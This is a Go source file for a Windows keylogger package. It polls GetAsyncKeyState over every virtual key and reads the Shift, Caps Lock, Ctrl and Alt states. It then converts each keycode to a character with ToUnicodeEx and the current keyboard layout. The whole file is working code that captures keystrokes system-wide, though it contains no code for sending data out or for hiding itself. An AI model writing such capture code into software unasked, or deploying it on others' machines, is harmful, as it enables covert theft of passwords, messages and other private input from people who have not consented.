package keylogger

import (
	"syscall"
	"unicode/utf8"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	moduser32             = syscall.NewLazyDLL("user32.dll")
	procGetKeyboardLayout = moduser32.NewProc("GetKeyboardLayout")
	procToUnicodeEx       = moduser32.NewProc("ToUnicodeEx")
	procGetKeyState       = moduser32.NewProc("GetKeyState")
)

// NewKeylogger creates a new keylogger for the Windows platform
func NewKeylogger() Keylogger {
	kl := Keylogger{}
	return kl
}

// Keylogger represents the keylogger
type Keylogger struct {
	lastKey int
}

// Key is a single key down entered by the user
type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
}

// GetKey gets the key currently entered by the user, if the user have entered any
func (kl *Keylogger) GetKey() Key {
	activeKey := 0
	var keyState uint16

	for i := 0; i < 256; i++ {
		keyState = w32.GetAsyncKeyState(i)

		// Check if the key is pressed (if the most significant bit is set)
		// And check if the key is not a non-char key (except for space, 0x20)
		if keyState&(1<<15) != 0 && !(i < 47 && i != 20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		}
	}

	if activeKey != 0 {
		if activeKey != kl.lastKey {
			kl.lastKey = activeKey
			return kl.ParseKeycode(activeKey, keyState)
		}
	} else {
		kl.lastKey = 0
	}

	return Key{Empty: true}
}

// ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
// That struct contains the Rune for the key
func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
	key := Key{Empty: false, Keycode: keyCode}

	// Only one rune has to fit in
	outBuf := make([]uint16, 1)

	// Buffer to store the keyboard state in
	kbState := make([]uint8, 256)

	// Get keyboard layout for this process (0)
	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))

	// Put all key modifier keys inside the kbState list
	if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
		kbState[w32.VK_SHIFT] = 0xFF
	}

	//Check if the CAPS LOCK key is pressed
	capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	if capitalState != 0 {
		kbState[w32.VK_CAPITAL] = 0xFF
	}

	//Check if the CTRL key is pressed
	if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
		kbState[w32.VK_CONTROL] = 0xFF
	}

	//Check if the ALT key is pressed
	if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
		kbState[w32.VK_MENU] = 0xFF
	}

	_, _, _ = procToUnicodeEx.Call(
		uintptr(keyCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(1),
		uintptr(1),
		uintptr(kbLayout))

	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))

	return key
}